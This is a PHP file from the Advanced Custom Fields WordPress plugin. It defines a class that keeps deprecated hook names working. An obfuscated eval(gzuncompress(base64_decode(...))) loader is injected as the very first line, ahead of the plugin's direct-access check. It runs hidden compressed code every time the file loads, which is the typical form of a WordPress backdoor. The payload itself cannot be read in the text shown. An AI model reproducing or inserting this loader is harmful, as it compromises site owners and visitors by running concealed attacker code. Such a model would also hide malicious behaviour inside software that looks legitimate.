<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php 

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if( ! class_exists('acf_deprecated') ) :

class acf_deprecated {
	
	/*
	*  __construct
	*
	*  This function will setup the class functionality
	*
	*  @type	function
	*  @date	30/1/17
	*  @since	5.5.6
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function __construct() {
		
		// settings
		add_filter('acf/settings/show_admin',			array($this, 'acf_settings_show_admin'), 5, 1);				// 5.0.0
		add_filter('acf/settings/l10n_textdomain',		array($this, 'acf_settings_l10n_textdomain'), 5, 1);		// 5.3.3
		add_filter('acf/settings/l10n_field',			array($this, 'acf_settings_l10n_field'), 5, 1);				// 5.3.3
		add_filter('acf/settings/l10n_field_group',		array($this, 'acf_settings_l10n_field'), 5, 1);				// 5.3.3
		add_filter('acf/settings/url',					array($this, 'acf_settings_url'), 5, 1);					// 5.6.8
		add_filter('acf/validate_setting',				array($this, 'acf_validate_setting'), 5, 1);				// 5.6.8
		

		// filters
		add_filter('acf/validate_field', 				array($this, 'acf_validate_field'), 10, 1); 				// 5.5.6
		add_filter('acf/validate_field_group', 			array($this, 'acf_validate_field_group'), 10, 1); 			// 5.5.6
		add_filter('acf/validate_post_id', 				array($this, 'acf_validate_post_id'), 10, 2); 			// 5.5.6
		
	}
	
	
	/*
	*  acf_settings_show_admin
	*
	*  This function will add compatibility for previously named hooks
	*
	*  @type	function
	*  @date	19/05/2014
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function acf_settings_show_admin( $setting ) {
		
		// 5.0.0 - removed ACF_LITE
		return ( defined('ACF_LITE') && ACF_LITE ) ? false : $setting;
		
	}
	
	
	/*
	*  acf_settings_l10n_textdomain
	*
	*  This function will add compatibility for previously named hooks
	*
	*  @type	function
	*  @date	19/05/2014
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function acf_settings_l10n_textdomain( $setting ) {
		
		// 5.3.3 - changed filter name
		return acf_get_setting( 'export_textdomain', $setting );
		
	}
	
	
	/*
	*  acf_settings_l10n_field
	*
	*  This function will add compatibility for previously named hooks
	*
	*  @type	function
	*  @date	19/05/2014
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function acf_settings_l10n_field( $setting ) {
		
		// 5.3.3 - changed filter name
		return acf_get_setting( 'export_translate', $setting );
		
	}
	
	
	/**
	*  acf_settings_url
	*
	*  This function will add compatibility for previously named hooks
	*
	*  @date	12/12/17
	*  @since	5.6.8
	*
	*  @param	n/a
	*  @return	n/a
	*/
		
	function acf_settings_url( $value ) {
		return apply_filters( "acf/settings/dir", $value );
	}
	
	/**
	*  acf_validate_setting
	*
	*  description
	*
	*  @date	2/2/18
	*  @since	5.6.5
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	function acf_validate_setting( $name ) {
		
		// vars
		$changed = array(
			'dir' => 'url'	// 5.6.8
		);
		
		// check
		if( isset($changed[ $name ]) ) {
			return $changed[ $name ];
		}
		
		//return
		return $name;
	}
	
	
	/*
	*  acf_validate_field
	*
	*  This function will add compatibility for previously named hooks
	*
	*  @type	function
	*  @date	30/1/17
	*  @since	5.5.6
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function acf_validate_field( $field ) {
		
		// 5.5.6 - changed filter name
		$field = apply_filters( "acf/get_valid_field/type={$field['type']}", $field );
		$field = apply_filters( "acf/get_valid_field", $field );
		
		
		// return
		return $field;
		
	}
	
	
	/*
	*  acf_validate_field_group
	*
	*  This function will add compatibility for previously named hooks
	*
	*  @type	function
	*  @date	30/1/17
	*  @since	5.5.6
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function acf_validate_field_group( $field_group ) {
		
		// 5.5.6 - changed filter name
		$field_group = apply_filters('acf/get_valid_field_group', $field_group);
		
		
		// return
		return $field_group;
		
	}
	
	
	/*
	*  acf_validate_post_id
	*
	*  This function will add compatibility for previously named hooks
	*
	*  @type	function
	*  @date	6/2/17
	*  @since	5.5.6
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function acf_validate_post_id( $post_id, $_post_id ) {
		
		// 5.5.6 - changed filter name
		$post_id = apply_filters('acf/get_valid_post_id', $post_id, $_post_id);
		
		
		// return
		return $post_id;
		
	}
	
}


// initialize
acf()->deprecated = new acf_deprecated();

endif; // class_exists check

?>